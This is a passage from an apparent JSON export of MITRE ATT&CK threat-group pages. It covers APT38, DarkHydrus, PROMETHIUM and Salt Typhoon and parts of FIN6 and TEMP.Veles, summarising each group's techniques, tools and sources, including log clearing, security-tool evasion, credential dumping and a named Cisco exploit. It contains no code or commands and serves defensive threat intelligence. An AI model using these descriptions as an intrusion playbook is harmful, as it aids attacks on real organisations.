Revenue, Masquerading: Match Legitimate Resource Name or Location, Masquerading, Native API, Obfuscated Files or Information, Process Discovery, Process Injection, Remote Services: SMB/Windows Admin Shares, Scheduled Task/Job: Scheduled Task, Service Stop, System Information Discovery, System Location Discovery: System Language Discovery, System Network Configuration Discovery, Traffic Signaling, Valid Accounts: Domain Accounts S0005 Windows Credential Editor [1] OS Credential Dumping: LSASS Memory References FireEye Threat Intelligence. (2016, April). Follow the Money: Dissecting the Operations of the Cyber Crime Group FIN6. Retrieved November 17, 2024. McKeague, B. et al. (2019, April 5). Pick-Six: Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware. Retrieved April 17, 2019. Villadsen, O. (2020, April 7). ITG08 (aka FIN6) Partners With TrickBot Gang, Uses Anchor Framework. Retrieved October 8, 2020. Villadsen, O.. (2019, August 29). More_eggs, Anyone? Threat Actor ITG08 Strikes Again. Retrieved September 16, 2019. CrowdStrike. (2018, February 26). CrowdStrike 2018 Global Threat Report. Retrieved October 10, 2018. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Chen, J. (2019, October 10). Magecart Card Skimmers Injected Into Online Shops. Retrieved September 9, 2020. Visa Public. (2019, February). FIN6 Cybercrime Group Expands Threat to eCommerce Merchants. Retrieved September 16, 2019. Klijnsma, Y. (2018, September 11). Inside the Magecart Breach of British Airways: How 22 Lines of Code Claimed 380,000 Victims. Retrieved September 9, 2020. Klijnsma, Y. (2018, September 19). Another Victim of the Magecart Assault Emerges: Newegg. Retrieved September 9, 2020. Kremez, V. (2019, September 19). FIN6 \u201cFrameworkPOS\u201d: Point-of-Sale Malware Analysis & Internals. Retrieved September 8, 2020. Priego, A. (2021, July). THE BROTHERS GRIM: THE REVERSING TALE OF GRIMAGENT MALWARE USED BY RYUK. Retrieved September 19, 2024. Kennelly, J., Goody, K., Shilko, J. (2020, May 7). Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents. Retrieved May 18, 2020. "
},
{
"id": 166,
"title": "APT38, NICKEL GLADSTONE, BeagleBoyz, Bluenoroff, Stardust Chollima, Sapphire Sleet, COPERNICIUM, Group G0082",
"path": "/groups/G0082/index.html",
"content": " APT38 APT38 is a North Korean state-sponsored threat group that specializes in financial cyber operations; it has been attributed to the Reconnaissance General Bureau.[1] Active since at least 2014, APT38 has targeted banks, financial institutions, casinos, cryptocurrency exchanges, SWIFT system endpoints, and ATMs in at least 38 countries worldwide. Significant operations include the 2016 Bank of Bangladesh heist, during which APT38 stole $81 million, as well as attacks against Bancomext [2] and Banco de Chile [2]; some of their attacks have been destructive.[1][2][3][4] North Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name Lazarus Group instead of tracking clusters or subgroups. ID: G0082 \u24d8 Associated Groups: NICKEL GLADSTONE, BeagleBoyz, Bluenoroff, Stardust Chollima, Sapphire Sleet, COPERNICIUM Contributors: Hiroki Nagahama, NEC Corporation; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India Version: 3.1 Created: 29 January 2019 Last Modified: 22 January 2025 Version Permalink Live Version Associated Group Descriptions Name Description NICKEL GLADSTONE [5] BeagleBoyz [1] Bluenoroff [4] Stardust Chollima [6][7] Sapphire Sleet [8] COPERNICIUM [8] Techniques Used Domain ID Name Use Enterprise T1548 .002 Abuse Elevation Control Mechanism: Bypass User Account Control APT38 has used the legitimate application ieinstal.exe to bypass UAC.[9] Enterprise T1583 .001 Acquire Infrastructure: Domains APT38 has created fake domains to imitate legitimate venture capital or bank domains.[9] Enterprise T1071 .001 Application Layer Protocol: Web Protocols APT38 used a backdoor, QUICKRIDE, to communicate to the C2 server over HTTP and HTTPS.[2] Enterprise T1217 Browser Information Discovery APT38 has collected browser bookmark information to learn more about compromised hosts, obtain personal information about users, and acquire details about internal network resources.[1] Enterprise T1110 Brute Force APT38 has used brute force techniques to attempt account access when passwords are unknown or when password hashes are unavailable.[1] Enterprise T1115 Clipboard Data APT38 used a Trojan called KEYLIME to collect data from the clipboard.[2] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell APT38 has used PowerShell to execute commands and other operational tasks.[1] .003 Command and Scripting Interpreter: Windows Command Shell APT38 has used a command-line tunneler, NACHOCHEESE, to give them shell access to a victim\u2019s machine.[2] Additionally, APT38 has used batch scripts.[9] .005 Command and Scripting Interpreter: Visual Basic APT38 has used VBScript to execute commands and other operational tasks.[1][9] Enterprise T1543 .003 Create or Modify System Process: Windows Service APT38 has installed a new Windows service to establish persistence.[1] Enterprise T1485 Data Destruction APT38 has used a custom secure delete function to make deleted files unrecoverable.[2] Enterprise T1486 Data Encrypted for Impact APT38 has used Hermes ransomware to encrypt files with AES256.[2] Enterprise T1005 Data from Local System APT38 has collected data from a compromised host.[1] Enterprise T1565 .001 Data Manipulation: Stored Data Manipulation APT38 has used DYEPACK to create, delete, and alter records in databases used for SWIFT transactions.[2] .002 Data Manipulation: Transmitted Data Manipulation APT38 has used DYEPACK to manipulate SWIFT messages en route to a printer.[2] .003 Data Manipulation: Runtime Data Manipulation APT38 has used DYEPACK.FOX to manipulate PDF data as it is accessed to remove traces of fraudulent SWIFT transactions from the data displayed to the end user.[2] Enterprise T1140 Deobfuscate/Decode Files or Information APT38 has used the RC4 algorithm to decrypt configuration data. [9] Enterprise T1561 .002 Disk Wipe: Disk Structure Wipe APT38 has used a custom MBR wiper named BOOTWRECK to render systems inoperable.[2] Enterprise T1189 Drive-by Compromise APT38 has conducted watering holes schemes to gain initial access to victims.[2][1] Enterprise T1480 .002 Execution Guardrails: Mutual Exclusion APT38 has created a mutex to avoid duplicate execution.[9] Enterprise T1083 File and Directory Discovery APT38 have enumerated files and directories, or searched in specific locations within a compromised host.[1] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools APT38 has unhooked DLLs to disable endpoint detection and response (EDR) or anti-virus (AV) tools.[9] .003 Impair Defenses: Impair Command History Logging APT38 has prepended a space to all of their terminal commands to operate without leaving traces in the HISTCONTROL environment.[1] .004 Impair Defenses: Disable or Modify System Firewall APT38 have created firewall exemptions on specific ports, including ports 443, 6443, 8443, and 9443.[1] Enterprise T1070 .001 Indicator Removal: Clear Windows Event Logs APT38 clears Window Event logs and Sysmon logs from the system.[2] .004 Indicator Removal: File Deletion APT38 has used a utility called CLOSESHAVE that can securely delete a file from the system. They have also removed malware, tools, or other non-native files used during the intrusion to reduce their footprint or as part of the post-intrusion cleanup process.[2][1] .006 Indicator Removal: Timestomp APT38 has modified data timestamps to mimic files that are in the same folder on a compromised host.[1] Enterprise T1105 Ingress Tool Transfer APT38 used a backdoor, NESTEGG, that has the capability to download and upload files to and from a victim\u2019s machine.[2] Additionally, APT38 has downloaded other payloads onto a victim\u2019s machine.[9] Enterprise T1056 .001 Input Capture: Keylogging APT38 used a Trojan called KEYLIME to capture keystrokes from the victim\u2019s machine.[2] Enterprise T1036 .003 Masquerading: Rename Legitimate Utilities APT38 has renamed system utilities, such as rundll32.exe and mshta.exe, to avoid detection.[9] .006 Masquerading: Space after Filename APT38 has put several spaces before a file extension to avoid detection and suspicion.[9] Enterprise T1112 Modify Registry APT38 uses a tool called CLEANTOAD that has the capability to modify Registry keys.[2] Enterprise T1106 Native API APT38 has used the Windows API to execute code within a victim's system.[1] Enterprise T1135 Network Share Discovery APT38 has enumerated network shares on a compromised host.[1] Enterprise T1027 .002 Obfuscated Files or Information: Software Packing APT38 has used several code packing methods such as Themida, Enigma, VMProtect, and Obsidium, to pack their implants.[2] Enterprise T1588 .002 Obtain Capabilities: Tool APT38 has obtained and used open-source tools such as Mimikatz.[10] Enterprise T1566 .001 Phishing: Spearphishing Attachment APT38 has conducted spearphishing campaigns using malicious email attachments.[1] Enterprise T1057 Process Discovery APT38 leveraged Sysmon to understand the processes, services in the organization.[2] Enterprise T1055 Process Injection APT38 has injected malicious payloads into the explorer.exe process.[9] Enterprise T1053 .003 Scheduled Task/Job: Cron APT38 has used cron to create pre-scheduled and periodic background jobs on a Linux system.[1] .005 Scheduled Task/Job: Scheduled Task APT38 has used Task Scheduler to run programs at system startup or on a scheduled basis for persistence.[1] Additionally, APT38 has used living-off-the-land scripts to execute a malicious script via a scheduled task.[9] Enterprise T1505 .003 Server Software Component: Web Shell APT38 has used web shells for persistence or to ensure redundant access.[1] Enterprise T1518 .001 Software Discovery: Security Software Discovery APT38 has identified security software, configurations, defensive tools, and sensors installed on a compromised system.[1][9] Enterprise T1553 .005 Subvert Trust Controls: Mark-of-the-Web Bypass APT38 has used ISO and VHD files to deploy malware and to bypass Mark-of-the-Web (MOTW) security measures.[9] Enterprise T1218 .001 System Binary Proxy Execution: Compiled HTML File APT38 has used CHM files to move concealed payloads.[11] .005 System Binary Proxy Execution: Mshta APT38 has used a renamed version of mshta.exe to execute malicious HTML files.[9] .007 System Binary Proxy Execution: Msiexec APT38 has used msiexec.exe to execute malicious files.[9] .011 System Binary Proxy Execution: Rundll32 APT38 has used rundll32.exe to execute binaries, scripts, and Control Panel Item files and to execute code via proxy to avoid triggering security tools.[1][9] Enterprise T1082 System Information Discovery APT38 has attempted to get detailed information about a compromised host, including the operating system, version, patches, hotfixes, and service packs.[1] Enterprise T1049 System Network Connections Discovery APT38 installed a port monitoring tool, MAPMAKER, to print the active TCP connections on the local system.[2] Enterprise T1033 System Owner/User Discovery APT38 has identified primary users, currently logged in users, sets of users that commonly use a system, or inactive users.[1] Enterprise T1569 .002 System Services: Service Execution APT38 has created new services or modified existing ones to run executables, commands, or scripts.[1] Enterprise T1529 System Shutdown/Reboot APT38 has used a custom MBR wiper named BOOTWRECK, which will initiate a system reboot after wiping the victim's MBR.[2] Enterprise T1204 .001 User Execution: Malicious Link APT38 has used links to execute a malicious Visual Basic script.[9] .002 User Execution: Malicious File APT38 has attempted to lure victims into enabling malicious macros within email attachments.[1] Additionally, APT38 has used malicious Word documents and shortcut files.[9] Software ID Name References Techniques S0334 DarkComet [2] Application Layer Protocol: Web Protocols, Audio Capture, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Clipboard Data, Command and Scripting Interpreter, Command and Scripting Interpreter: Windows Command Shell, Impair Defenses: Disable or Modify System Firewall, Impair Defenses: Disable or Modify Tools, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Match Legitimate Resource Name or Location, Modify Registry, Obfuscated Files or Information: Software Packing, Process Discovery, Remote Services: Remote Desktop Protocol, System Information Discovery, System Owner/User Discovery, Video Capture S0593 ECCENTRICBANDWAGON [1] Command and Scripting Interpreter: Windows Command Shell, Data Staged: Local Data Staging, Indicator Removal: File Deletion, Input Capture: Keylogging, Obfuscated Files or Information, Screen Capture S0376 HOPLIGHT [1] Command and Scripting Interpreter: Windows Command Shell, Data Encoding: Standard Encoding, Device Driver Discovery, Event Triggered Execution: Windows Management Instrumentation Event Subscription, Exfiltration Over C2 Channel, Fallback Channels, File and Directory Discovery, Impair Defenses: Disable or Modify System Firewall, Ingress Tool Transfer, Modify Registry, Non-Standard Port, OS Credential Dumping: Security Account Manager, Process Injection, Proxy, Query Registry, System Information Discovery, System Services: Service Execution, System Time Discovery, Use Alternate Authentication Material: Pass the Hash, Windows Management Instrumentation S0607 KillDisk [10] Access Token Manipulation, Data Destruction, Data Destruction, Data Encrypted for Impact, Disk Wipe: Disk Structure Wipe, File and Directory Discovery, Indicator Removal: Clear Windows Event Logs, Indicator Removal: File Deletion, Indicator Removal on Host, Loss of View, Masquerading: Masquerade Task or Service, Native API, Obfuscated Files or Information, Process Discovery, Service Stop, Service Stop, Shared Modules, System Information Discovery, System Shutdown/Reboot S0002 Mimikatz [2] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0039 Net [2] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery References DHS/CISA. (2020, August 26). FASTCash 2.0: North Korea's BeagleBoyz Robbing Banks. Retrieved September 29, 2021. FireEye. (2018, October 03). APT38: Un-usual Suspects. Retrieved November 17, 2024. Department of Justice. (2021, February 17). Three North Korean Military Hackers Indicted in Wide-Ranging Scheme to Commit Cyberattacks and Financial Crimes Across the Globe. Retrieved June 9, 2021. GReAT. (2017, April 3). Lazarus Under the Hood. Retrieved April 17, 2019. SecureWorks. (2021, September 29). NICKEL GLADSTONE Threat Profile. Retrieved September 29, 2021. Meyers, Adam. (2018, April 6). Meet CrowdStrike\u2019s Adversary of the Month for April: STARDUST CHOLLIMA. Retrieved September 29, 2021. CrowdStrike. (2021, June 7). CrowdStrike 2021 Global Threat Report. Retrieved September 29, 2021. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. SEONGSU PARK. (2022, December 27). BlueNoroff introduces new methods bypassing MoTW. Retrieved February 6, 2024. K\u00e1lnai, P., Cherepanov A. (2018, April 03). Lazarus KillDisks Central American casino. Retrieved May 17, 2018. GReAT. (2017, April 3). Lazarus Under the Hood. Retrieved October 3, 2018. "
},
{
"id": 167,
"title": "DarkHydrus, Group G0079",
"path": "/groups/G0079/index.html",
"content": " DarkHydrus DarkHydrus is a threat group that has targeted government agencies and educational institutions in the Middle East since at least 2016. The group heavily leverages open-source tools and custom payloads for carrying out attacks. [1] [2] ID: G0079 Contributors: Oleg Skulkin, Group-IB Version: 1.3 Created: 17 October 2018 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell DarkHydrus leveraged PowerShell to download and execute additional scripts for execution.[1][2] Enterprise T1187 Forced Authentication DarkHydrus used Template Injection to launch an authentication window for users to enter their credentials.[3] Enterprise T1564 .003 Hide Artifacts: Hidden Window DarkHydrus has used -WindowStyle Hidden to conceal PowerShell windows. [1] Enterprise T1588 .002 Obtain Capabilities: Tool DarkHydrus has obtained and used tools such as Mimikatz, Empire, and Cobalt Strike.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment DarkHydrus has sent spearphishing emails with password-protected RAR archives containing malicious Excel Web Query files (.iqy). The group has also sent spearphishing emails that contained malicious Microsoft Office documents that use the \"attachedTemplate\" technique to load a template from a remote server.[1][3][2] Enterprise T1221 Template Injection DarkHydrus used an open-source tool, Phishery, to inject malicious remote template URLs into Microsoft Word documents and then sent them to victims to enable Forced Authentication.[3] Enterprise T1204 .002 User Execution: Malicious File DarkHydrus has sent malware that required users to hit the enable button in Microsoft Excel to allow an .iqy file to be downloaded.[1][2] Software ID Name References Techniques S0154 Cobalt Strike [1][2] Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Parent PID Spoofing, Access Token Manipulation: Token Impersonation/Theft, Access Token Manipulation: Make and Impersonate Token, Account Discovery: Domain Account, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, BITS Jobs, Browser Session Hijacking, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exploitation for Client Execution, Exploitation for Privilege Escalation, File and Directory Discovery, Hide Artifacts: Process Argument Spoofing, Impair Defenses: Disable or Modify Tools, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information, Office Application Startup: Office Template Macros, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: Domain Fronting, Proxy: Internal Proxy, Query Registry, Reflective Code Loading, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: Windows Remote Management, Remote Services: SMB/Windows Admin Shares, Remote Services: Distributed Component Object Model, Remote System Discovery, Scheduled Transfer, Screen Capture, Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Use Alternate Authentication Material: Pass the Hash, Valid Accounts: Domain Accounts, Valid Accounts: Local Accounts, Windows Management Instrumentation S0002 Mimikatz [1][2] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0270 RogueRobin [1][4] Boot or Logon Autostart Execution: Shortcut Modification, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Data Encoding: Standard Encoding, Deobfuscate/Decode Files or Information, Ingress Tool Transfer, Obfuscated Files or Information: Command Obfuscation, Process Discovery, Screen Capture, Software Discovery: Security Software Discovery, System Binary Proxy Execution: Regsvr32, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, Virtualization/Sandbox Evasion: System Checks, Web Service: Bidirectional Communication, Windows Management Instrumentation References Falcone, R., et al. (2018, July 27). New Threat Actor Group DarkHydrus Targets Middle East Government. Retrieved August 2, 2018. Unit 42. (2017, December 15). Unit 42 Playbook Viewer. Retrieved December 20, 2017. Falcone, R. (2018, August 07). DarkHydrus Uses Phishery to Harvest Credentials in the Middle East. Retrieved August 10, 2018. Lee, B., Falcone, R. (2019, January 18). DarkHydrus delivers new Trojan that can use Google Drive for C2 communications. Retrieved April 17, 2019. "
},
{
"id": 168,
"title": "PROMETHIUM, StrongPity, Group G0056",
"path": "/groups/G0056/index.html",
"content": " PROMETHIUM PROMETHIUM is an activity group focused on espionage that has been active since at least 2012. The group has conducted operations globally with a heavy emphasis on Turkish targets. PROMETHIUM has demonstrated similarity to another activity group called NEODYMIUM due to overlapping victim and campaign characteristics.[1][2][3] ID: G0056 \u24d8 Associated Groups: StrongPity Version: 2.1 Created: 16 January 2018 Last Modified: 19 April 2024 Version Permalink Live Version Associated Group Descriptions Name Description StrongPity The name StrongPity has also been used to describe the group and the malware used by the group.[4][3] Campaigns ID Name First Seen Last Seen References Techniques C0033 C0033 May 2016 [5] January 2023 [6] [3][4] Access Notifications, Application Layer Protocol: Web Protocols, Archive Collected Data, Audio Capture, Drive-By Compromise, Encrypted Channel: Symmetric Cryptography, Event Triggered Execution: Broadcast Receivers, Exfiltration Over C2 Channel, File and Directory Discovery, Impair Defenses: Disable or Modify Tools, Ingress Tool Transfer, Location Tracking, Masquerading: Match Legitimate Name or Location, Obfuscated Files or Information, Protected User Data: SMS Messages, Protected User Data: Call Log, Protected User Data: Contact List, Software Discovery, System Information Discovery, System Network Connections Discovery Techniques Used Domain ID Name Use Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder PROMETHIUM has used Registry run keys to establish persistence.[3] Enterprise T1543 .003 Create or Modify System Process: Windows Service PROMETHIUM has created new services and modified existing services for persistence.[4] Enterprise T1587 .002 Develop Capabilities: Code Signing Certificates PROMETHIUM has created self-signed certificates to sign malicious installers.[4] .003 Develop Capabilities: Digital Certificates PROMETHIUM has created self-signed digital certificates for use in HTTPS C2 traffic.[3] Enterprise T1189 Drive-by Compromise PROMETHIUM has used watering hole attacks to deliver malicious versions of legitimate installers.[4] Enterprise T1036 .004 Masquerading: Masquerade Task or Service PROMETHIUM has named services to appear legitimate.[3][4] .005 Masquerading: Match Legitimate Resource Name or Location PROMETHIUM has disguised malicious installer files by bundling them with legitimate software installers.[3][4] Enterprise T1553 .002 Subvert Trust Controls: Code Signing PROMETHIUM has signed code with self-signed certificates.[4] Enterprise T1205 .001 Traffic Signaling: Port Knocking PROMETHIUM has used a script that configures the knockd service and firewall to only accept C2 connections from systems that use a specified sequence of knock ports.[4] Enterprise T1204 .002 User Execution: Malicious File PROMETHIUM has attempted to get users to execute compromised installation files for legitimate software including compression applications, security software, browsers, file recovery applications, and other tools and utilities.[3][4] Enterprise T1078 .003 Valid Accounts: Local Accounts PROMETHIUM has created admin accounts on a compromised host.[4] Mobile T1517 Access Notifications During C0033, PROMETHIUM used StrongPity to collect message notifications from 17 applications.[6] Mobile T1437 .001 Application Layer Protocol: Web Protocols During C0033, PROMETHIUM used StrongPity to communicate with the C2 server using HTTPS.[6] Mobile T1532 Archive Collected Data During C0033, PROMETHIUM used StrongPity to exfiltrate encrypted data to the C2 server.[6] Mobile T1429 Audio Capture During C0033, PROMETHIUM used StrongPity to record phone calls.[6] Mobile T1456 Drive-By Compromise During C0033, PROMETHIUM distributed StrongPity through the compromised official Syrian E-Gov website.[7] Mobile T1521 .001 Encrypted Channel: Symmetric Cryptography During C0033, PROMETHIUM used StrongPity to encrypt C2 communication using AES.[6] Mobile T1624 .001 Event Triggered Execution: Broadcast Receivers During C0033, PROMETHIUM used StrongPity to receive the following broadcast events to establish persistence: BOOT_COMPLETED, BATTERY_LOW,USER_PRESENT, SCREEN_ON, SCREEN_OFF, or CONNECTIVITY_CHANGE.[6] Mobile T1646 Exfiltration Over C2 Channel During C0033, PROMETHIUM used StrongPity to exfiltrate to the C2 server using HTTPS.[6][7] Mobile T1420 File and Directory Discovery During C0033, PROMETHIUM used StrongPity to collect file lists on the victim device.[6] Mobile T1629 .003 Impair Defenses: Disable or Modify Tools During C0033, PROMETHIUM used StrongPity to modify permissions on a rooted device and tried to disable the SecurityLogAgent application.[6] Mobile T1544 Ingress Tool Transfer During C0033, PROMETHIUM used StrongPity to receive files from the C2 and execute them via the parent application.[6] Mobile T1430 Location Tracking During C0033, PROMETHIUM used StrongPity to access the device\u2019s location.[6] Mobile T1655 .001 Masquerading: Match Legitimate Name or Location During C0033, PROMETHIUM used StrongPity on a compromised website to distribute a malicious version of a legitimate application.[7] Mobile T1406 Obfuscated Files or Information During C0033, PROMETHIUM used StrongPity to obfuscate code and strings to evade detection.[6] Mobile T1636 .002 Protected User Data: Call Log During C0033, PROMETHIUM used StrongPity to collect call logs.[6] .003 Protected User Data: Contact List During C0033, PROMETHIUM used StrongPity to collect the device\u2019s contact list.[6] .004 Protected User Data: SMS Messages During C0033, PROMETHIUM used StrongPity to collect SMS messages.[6] Mobile T1418 Software Discovery During C0033, PROMETHIUM used StrongPity to obtain a list of installed applications.[6] Mobile T1426 System Information Discovery During C0033, PROMETHIUM used StrongPity to collect the device\u2019s information, such as SIM serial number, SIM serial number, etc.[6] Mobile T1421 System Network Connections Discovery During C0033, PROMETHIUM used StrongPity to collect information regarding available Wi-Fi networks.[7] Software ID Name References Techniques S0491 StrongPity [4][3] Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Custom Method, Automated Collection, Automated Exfiltration, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: PowerShell, Create or Modify System Process: Windows Service, Encrypted Channel: Asymmetric Cryptography, Exfiltration Over C2 Channel, File and Directory Discovery, Hide Artifacts: Hidden Window, Impair Defenses: Disable or Modify Tools, Indicator Removal: File Deletion, Ingress Tool Transfer, Masquerading: Masquerade Task or Service, Masquerading: Match Legitimate Resource Name or Location, Non-Standard Port, Obfuscated Files or Information: Encrypted/Encoded File, Process Discovery, Proxy: Multi-hop Proxy, Software Discovery: Security Software Discovery, Subvert Trust Controls: Code Signing, System Information Discovery, System Network Configuration Discovery, System Services: Service Execution, User Execution: Malicious File S0178 Truvasys [1][2] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Masquerading: Masquerade Task or Service References Microsoft. (2016, December 14). Twin zero-day attacks: PROMETHIUM and NEODYMIUM target individuals in Europe. Retrieved November 27, 2017. Anthe, C. et al. (2016, December 14). Microsoft Security Intelligence Report Volume 21. Retrieved November 27, 2017. Mercer, W. et al. (2020, June 29). PROMETHIUM extends global reach with StrongPity3 APT. Retrieved July 20, 2020. Tudorica, R. et al. (2020, June 30). StrongPity APT - Revealing Trojanized Tools, Working Hours and Infrastructure. Retrieved July 20, 2020. Baumgartner, K. (2016, October 3). On the StrongPity Waterhole Attacks Targeting Italian and Belgian Encryption Users. Retrieved March 28, 2024. Stefanko, L. (2023, January 10). StrongPity espionage campaign targeting Android users. Retrieved January 31, 2023. Dong, Z. et al. (2021, July 21). StrongPity APT Group Deploys Android Malware for the First Time. Retrieved March 19, 2023. "
},
{
"id": 169,
"title": "Salt Typhoon, Group G1045",
"path": "/groups/G1045/index.html",
"content": " Salt Typhoon Salt Typhoon is a People's Republic of China (PRC) state-backed actor that has been active since at least 2019 and responsible for numerous compromises of network infrastructure at major U.S. telecommunication and internet service providers (ISP).[1][2] ID: G1045 Version: 1.0 Created: 24 February 2025 Last Modified: 06 March 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1098 .004 Account Manipulation: SSH Authorized Keys Salt Typhoon has added SSH authorized_keys under root or other users at the Linux level on compromised network devices.[2] Enterprise T1110 .002 Brute Force: Password Cracking Salt Typhoon has cracked passwords for accounts with weak encryption obtained from the configuration files of compromised network devices.[2] Enterprise T1136 Create Account Salt Typhoon has created Linux-level users on compromised network devices through modification of /etc/shadow and /etc/passwd.[2] Enterprise T1602 .002 Data from Configuration Repository: Network Device Configuration Dump Salt Typhoon has attempted to acquire credentials by dumping network device configurations.[2] Enterprise T1587 .001 Develop Capabilities: Malware Salt Typhoon has used custom tooling including JumbledPath.[2] Enterprise T1048 .003 Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol Salt Typhoon has exfiltrated configuration files from exploited network devices over FTP and TFTP.[2] Enterprise T1190 Exploit Public-Facing Application Salt Typhoon has exploited CVE-2018-0171 in the Smart Install feature of Cisco IOS and Cisco IOS XE software for initial access.[2] Enterprise T1590 .004 Gather Victim Network Information: Network Topology Salt Typhoon has used configuration files from exploited network devices to help discover upstream and downstream network segments.[2] Enterprise T1562 .004 Impair Defenses: Disable or Modify System Firewall Salt Typhoon has made changes to the Access Control List (ACL) and loopback interface address on compromised devices.[2] Enterprise T1070 .002 Indicator Removal: Clear Linux or Mac System Logs Salt Typhoon has cleared logs including .bash_history, auth.log, lastlog, wtmp, and btmp.[2] Enterprise T1040 Network Sniffing Salt Typhoon has used a variety of tools and techniques to capture packet data between network interfaces.[2] Enterprise T1588 .002 Obtain Capabilities: Tool Salt Typhoon has used publicly available tooling to exploit vulnerabilities.[2] Enterprise T1572 Protocol Tunneling Salt Typhoon has modified device configurations to create and use Generic Routing Encapsulation (GRE) tunnels.[2] Enterprise T1021 .004 Remote Services: SSH Salt Typhoon has modified the loopback address on compromised switches and used them as the source of SSH connections to additional devices within the target environment, allowing them to bypass access control lists (ACLs).[2] Software ID Name References Techniques S1206 JumbledPath [2] Archive Collected Data, Hide Infrastructure, Impair Defenses, Indicator Removal: Clear Linux or Mac System Logs, Multi-Stage Channels, Network Sniffing References US Department of Treasury. (2025, January 17). Treasury Sanctions Company Associated with Salt Typhoon and Hacker Associated with Treasury Compromise. Retrieved February 24, 2025. Cisco Talos. (2025, February 20). Weathering the storm: In the midst of a Typhoon. Retrieved February 24, 2025. "
},
{
"id": 170,
"title": "TEMP.Veles, XENOTIME, Group G0088",
"path": "/groups/G0088/index.html",
"content": " TEMP.Veles TEMP.Veles is a Russia-based threat group that has targeted critical infrastructure. The group has been observed utilizing TRITON, a malware framework designed to manipulate industrial safety systems.[1][2][3] ID: G0088 \u24d8 Associated Groups: XENOTIME Contributors: Dragos Threat Intelligence Version: 1.4 Created: 16 April 2019 Last Modified: 17 April 2024 Version Permalink Live Version Associated Group Descriptions Name Description XENOTIME The activity group XENOTIME, as defined by Dragos, has overlaps with activity reported upon by FireEye about TEMP.Veles as well as the actors behind TRITON.[4][5][1][2] Campaigns ID Name First Seen Last Seen References Techniques C0032 C0032 October 2014 [1] January 2017 [1] [1] Acquire Infrastructure: Virtual Private Server, Command and Scripting Interpreter: PowerShell, Data Staged: Local Data Staging, Event Triggered Execution: Image File Execution Options Injection, External Remote Services, Indicator Removal: File Deletion, Indicator Removal: Timestomp, Masquerading: Match Legitimate Resource Name or Location, Non-Standard Port, Obtain Capabilities: Tool, OS Credential Dumping: LSASS Memory, Protocol Tunneling, Remote Services: SSH, Remote 